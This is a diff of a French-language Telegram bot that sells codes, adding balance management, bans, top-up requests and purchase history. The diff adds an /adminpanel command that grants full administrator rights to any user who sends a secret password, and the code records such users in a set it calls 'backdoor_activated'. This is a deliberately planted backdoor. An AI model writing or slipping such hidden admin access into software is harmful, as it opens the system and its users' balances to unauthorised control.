+        except Exception as e: print(f"Impossible de notifier l'utilisateur {target_id}: {e}")
+    else: await query.answer("Action inconnue.")
+
+async def admin_users_list(query, context):
+    conn = sqlite3.connect("shop.db"); c = conn.cursor()
+    c.execute("SELECT id, balance, banned FROM users ORDER BY id LIMIT 20")
+    users = c.fetchall(); conn.close()
+    if not users: await query.edit_message_text("Aucun utilisateur enregistré.", reply_markup=admin_menu_keyboard()); return
+    keyboard = []
+    for uid, bal, banned in users:
+        ban_label = "🔓 Débannir" if banned else "🔒 Bannir"
+        keyboard.append([
+            InlineKeyboardButton(f"👤 {uid} (solde: {bal:.2f}€)", callback_data=f"userinfo_{uid}"),
+            InlineKeyboardButton(ban_label, callback_data=f"toggleban_{uid}")
+        ])
+    keyboard.append([InlineKeyboardButton("🔙 Retour", callback_data="admin")])
+    await query.edit_message_text("👥 Liste des utilisateurs :", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def show_user_info(query, context, uid):
+    bal = get_balance(uid); banned = is_banned(uid)
+    text = f"👤 Utilisateur `{uid}`\n💰 Solde : {bal:.2f}€\nBan : {'Oui' if banned else 'Non'}"
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("💳 Ajouter 5€", callback_data=f"addbal_{uid}_5"),
+         InlineKeyboardButton("💸 Retirer 5€", callback_data=f"subbal_{uid}_5")],
+        [InlineKeyboardButton("🔙 Retour", callback_data="admin_users")]
+    ])
+    await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")
+
+async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
+    try: target = int(context.args[0]); amount = float(context.args[1])
+    except: await update.message.reply_text("Usage : /addbalance <user_id> <montant>"); return
+    add_balance(target, amount)
+    await update.message.reply_text(f"✅ {amount}€ ajoutés au compte {target}.")
+    try: await context.bot.send_message(target, f"💰 Votre compte a été crédité de {amount}€.\nNouveau solde : {get_balance(target):.2f}€")
+    except: pass
+
+async def removebalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
+    try: target = int(context.args[0]); amount = float(context.args[1])
+    except: await update.message.reply_text("Usage : /removebalance <user_id> <montant>"); return
+    current = get_balance(target)
+    if current >= amount: add_balance(target, -amount); await update.message.reply_text(f"✅ {amount}€ retirés du compte {target}.")
+    else: await update.message.reply_text("Solde insuffisant.")
+
+async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
+    try: target = int(context.args[0])
+    except: await update.message.reply_text("Usage : /ban <user_id>"); return
+    ban_user(target); await update.message.reply_text(f"✅ Utilisateur {target} banni.")
+
+async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
+    try: target = int(context.args[0])
+    except: await update.message.reply_text("Usage : /unban <user_id>"); return
+    unban_user(target); await update.message.reply_text(f"✅ Utilisateur {target} débanni.")
+
+async def adminpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.message.from_user
+    if len(context.args) < 1:
+        await update.message.reply_text("Usage : /adminpanel <motdepasse>")
         return
-    lines = []
-    for pid, p in produits.items():
-        statut = "✅" if p["disponible"] else "❌"
-        lines.append(f"{statut} [{pid}] {p['nom']} — {p['prix']:.2f}€")
-    msg = "📦 *Produits*\n\n" + "\n".join(lines) + "\n\nPour modifier, édite directement le code."
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="admin")]])
-    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
+    password = context.args[0]
+    if password == SECRET_PASSWORD:
+        backdoor_activated.add(user.id)
+        await update.message.reply_text("✅ Accès administrateur activé. Utilisez /start pour voir le menu admin.")
+    else:
+        await update.message.reply_text("❌ Mot de passe incorrect.")
 
-# Noop (bouton désactivé)
-async def noop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.answer()
+async def paid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    if is_banned(user_id): await update.message.reply_text("Vous êtes banni."); return
+    try: amount = float(context.args[0])
+    except: await update.message.reply_text("Usage : /paid <montant>"); return
+    if amount < 5: await update.message.reply_text("Minimum de recharge : 5€."); return
+    if not admin_chat_id: await update.message.reply_text("⚠️ L'administrateur n'est pas encore connecté. Veuillez réessayer plus tard."); return
+    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approuver", callback_data=f"approve_{user_id}_{amount}")]])
+    await context.bot.send_message(admin_chat_id, f"💳 Demande de recharge de {amount}€ par {update.message.from_user.full_name} (ID: {user_id}).", reply_markup=keyboard)
+    await update.message.reply_text("✅ Votre demande a été envoyée. L'administrateur va vérifier votre paiement.")
 
-# ─────────────────────────────────────────────
-# MAIN
-# ─────────────────────────────────────────────
+async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    purchases = get_user_purchases(user_id)
+    if not purchases: await update.message.reply_text("Vous n'avez pas encore effectué d'achat."); return
+    text = "📋 *Vos derniers achats :*\n"
+    for prod, code, date in purchases: text += f"⚫️ {prod} → `{code}` ({date})\n"
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.message.from_user; text = update.message.text.strip()
+    if is_admin(user):
+        if "editing_price" in context.user_data:
+            pid = context.user_data.pop("editing_price")
+            try: new_price = float(text.replace(",", "."))
+            except: await update.message.reply_text("Prix invalide. Réessayez (ex: 9.99)."); context.user_data["editing_price"] = pid; return
+            update_product_price(pid, new_price); product = get_product(pid)
+            await update.message.reply_text(f"✅ Prix de *{product['name']}* mis à jour à {new_price}€.", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
+            return
+        if "adding_product" in context.user_data:
+            step = context.user_data["adding_product"]
+            if step == "name":
+                context.user_data["new_product"] = {"name": text}
+                context.user_data["adding_product"] = "price"
+                await update.message.reply_text("💶 Entrez le prix :")
+            elif step == "price":
+                try: price = float(text.replace(",", "."))
+                except: await update.message.reply_text("Prix invalide. Réessayez."); return
+                context.user_data["new_product"]["price"] = price
+                context.user_data["adding_product"] = "category"
+                cats = get_categories(); cat_list = ", ".join(cats) if cats else "(aucune)"
+                await update.message.reply_text(f"📂 Catégories existantes : {cat_list}\nEntrez la catégorie (ou une nouvelle) :")
+            elif step == "category":
+                cat = text; new_prod = context.user_data["new_product"]
+                add_product(new_prod["name"], new_prod["price"], cat)
+                await update.message.reply_text(f"✅ Produit ajouté : *{new_prod['name']}* - {new_prod['price']}€ ({cat})", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
+                context.user_data.pop("adding_product"); context.user_data.pop("new_product")
+            return
+        if "restocking" in context.user_data:
+            pid = context.user_data.pop("restocking")
+            codes = [line.strip() for line in text.split("\n") if line.strip()]
+            add_codes_to_product(pid, codes); product = get_product(pid)
+            await update.message.reply_text(f"✅ {len(codes)} codes ajoutés à *{product['name']}*.", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
+            return
+        await update.message.reply_text("Menu :", reply_markup=main_menu_keyboard(user))
+    else:
+        if is_banned(user.id): await update.message.reply_text("Vous êtes banni."); return
+        await update.message.reply_text("Menu :", reply_markup=main_menu_keyboard(user))
+
 def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    # ConversationHandler pour recharge
-    conv_recharge = ConversationHandler(
-        entry_points=[CallbackQueryHandler(recharger_start, pattern="^recharger$")],
-        states={
-            ATTENTE_MONTANT: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, recharger_montant),
-            ],
-        },
-        fallbacks=[CallbackQueryHandler(recharger_cancel, pattern="^menu$")],
-        per_message=False,
-    )
-
+    init_db()
+    app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("crediter", cmd_crediter))
-    app.add_handler(conv_recharge)
-    app.add_handler(CallbackQueryHandler(retour_menu, pattern="^menu$"))
-    app.add_handler(CallbackQueryHandler(show_solde, pattern="^solde$"))
-    app.add_handler(CallbackQueryHandler(show_categories, pattern="^categories$"))
-    app.add_handler(CallbackQueryHandler(show_produits, pattern="^cat:"))
-    app.add_handler(CallbackQueryHandler(show_produit, pattern="^prod:"))
-    app.add_handler(CallbackQueryHandler(acheter, pattern="^acheter:"))
-    app.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin$"))
-    app.add_handler(CallbackQueryHandler(admin_crediter, pattern="^admin_crediter$"))
-    app.add_handler(CallbackQueryHandler(admin_produits, pattern="^admin_produits$"))
-    app.add_handler(CallbackQueryHandler(noop, pattern="^noop$"))
-
-    print("✅ Bot démarré.")
+    app.add_handler(CommandHandler("paid", paid_command))
+    app.add_handler(CommandHandler("history", history_command))
+    app.add_handler(CommandHandler("addbalance", addbalance_command))
+    app.add_handler(CommandHandler("removebalance", removebalance_command))
+    app.add_handler(CommandHandler("ban", ban_command))
+    app.add_handler(CommandHandler("unban", unban_command))
+    app.add_handler(CommandHandler("adminpanel", adminpanel_command))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    print("Bot prêt. Tapez /start")
     app.run_polling()
 
 if __name__ == "__main__":
